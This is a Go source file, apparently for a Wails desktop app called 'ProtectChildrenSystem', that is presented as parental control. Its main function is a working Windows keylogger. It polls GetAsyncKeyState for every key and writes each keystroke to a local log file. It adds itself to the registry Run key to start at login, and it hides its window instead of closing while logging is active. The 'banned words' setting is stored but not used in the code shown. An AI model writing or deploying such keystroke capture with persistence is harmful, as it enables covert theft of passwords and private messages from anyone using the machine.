package main

import (
	"context"
	"encoding/json"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
	"time"

	"github.com/wailsapp/wails/v2/pkg/runtime"
)

var (
	user32Api            = syscall.NewLazyDLL("user32.dll")
	procGetAsyncKeyState = user32Api.NewProc("GetAsyncKeyState")
)

type AppConfig struct {
	BannedWords string `json:"banned_words"`
	IsRunning   bool   `json:"is_running"`
	AutoStart   bool   `json:"auto_start"`
}

type App struct {
	ctx          context.Context
	isRunning    bool
	cancelFunc   context.CancelFunc
	lastKeyState [256]bool
	bannedWords  string
	dbPath       string
	logPath      string
	isAutoStart  bool
}

func NewApp() *App {
	exePath, _ := os.Executable()
	baseDir := filepath.Dir(exePath)

	return &App{
		dbPath:  filepath.Join(baseDir, "db", "config.json"),
		logPath: filepath.Join(baseDir, "db", "activity.log"),
	}
}

func (a *App) startup(ctx context.Context) {
	a.ctx = ctx
	os.MkdirAll(filepath.Dir(a.dbPath), 0755)
	a.loadFromDB()

	go func() {
		time.Sleep(500 * time.Millisecond)
		if a.isRunning {
			a.ToggleProtections(true)
		}
	}()
}

// --- Fungsi Baru untuk Kebutuhan Frontend ---

func (a *App) GetCurrentConfig() AppConfig {
	return AppConfig{
		BannedWords: a.bannedWords,
		IsRunning:   a.isRunning,
		AutoStart:   a.isAutoStart,
	}
}

func (a *App) UpdateBannedWords(words string) {
	a.bannedWords = words
	a.saveToDB()
}

func (a *App) ReadLogs() string {
	content, err := os.ReadFile(a.logPath)
	if err != nil {
		return ""
	}
	return string(content)
}

// --- Akhir Fungsi Baru ---

func (a *App) loadFromDB() {
	file, err := os.ReadFile(a.dbPath)
	if err != nil {
		return
	}
	var data AppConfig
	json.Unmarshal(file, &data)

	a.bannedWords = data.BannedWords
	a.isAutoStart = data.AutoStart
	a.isRunning = data.IsRunning
}

func (a *App) saveToDB() {
	data := AppConfig{
		BannedWords: a.bannedWords,
		IsRunning:   a.isRunning,
		AutoStart:   a.isAutoStart,
	}
	file, _ := json.MarshalIndent(data, "", "  ")
	os.WriteFile(a.dbPath, file, 0644)
}

func (a *App) ToggleProtections(status bool) {
	if a.cancelFunc != nil {
		a.cancelFunc()
		a.cancelFunc = nil
	}

	a.isRunning = status
	a.saveToDB()

	if a.ctx != nil {
		runtime.EventsEmit(a.ctx, "status-updated", status)
	}

	if a.isRunning {
		ctx, cancel := context.WithCancel(context.Background())
		a.cancelFunc = cancel
		go a.runKeylogger(ctx)
	}
}

func (a *App) SetAutoStart(enable bool) string {
	exePath, _ := os.Executable()
	appName := "ProtectChildrenSystem"
	a.isAutoStart = enable
	a.saveToDB()

	if enable {
		exec.Command("reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", appName, "/t", "REG_SZ", "/d", `"`+exePath+`" --autostart`, "/f").Run()
		return "Startup Enabled"
	}
	exec.Command("reg", "delete", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", appName, "/f").Run()
	return "Startup Disabled"
}

func (a *App) runKeylogger(ctx context.Context) {
	for {
		select {
		case <-ctx.Done():
			return
		default:
			for i := 1; i < 256; i++ {
				v, _, _ := procGetAsyncKeyState.Call(uintptr(i))
				if v&0x8000 != 0 && !a.lastKeyState[i] {
					char := a.mapKeys(i)
					if char != "" {
						a.writeToLog(char)
						// Mengirim event ke Frontend agar tampilan update otomatis
						if a.ctx != nil {
							runtime.EventsEmit(a.ctx, "new-key-event", map[string]string{"text": char})
						}
					}
				}
				a.lastKeyState[i] = v&0x8000 != 0
			}
			time.Sleep(15 * time.Millisecond)
		}
	}
}

func (a *App) mapKeys(vk int) string {
	if vk >= 0x30 && vk <= 0x39 {
		return string(rune(vk))
	}
	if vk >= 0x41 && vk <= 0x5A {
		return string(rune(vk + 32))
	}

	switch vk {
	case 0x20:
		return " "
	case 0x0D:
		return "[ENTER]" // Diubah agar sesuai dengan filter specialKeys di frontend
	case 0x08:
		return "[BACKSPACE]"
	case 0x09:
		return "[TAB]"
	case 0x10:
		return "[SHIFT]"
	case 0x11:
		return "[CTRL]"
	case 0x14:
		return "[CAPSLOCK]"
	}
	return ""
}

func (a *App) writeToLog(content string) {
	f, _ := os.OpenFile(a.logPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if f != nil {
		defer f.Close()
		// Jika special key, berikan penanda di log file
		if len(content) > 1 {
			f.WriteString(" " + content + " ")
		} else {
			f.WriteString(content)
		}
	}
}

func (a *App) OnBeforeClose(ctx context.Context) bool {
	if a.isRunning {
		runtime.WindowHide(ctx)
		return true
	}
	return false
}
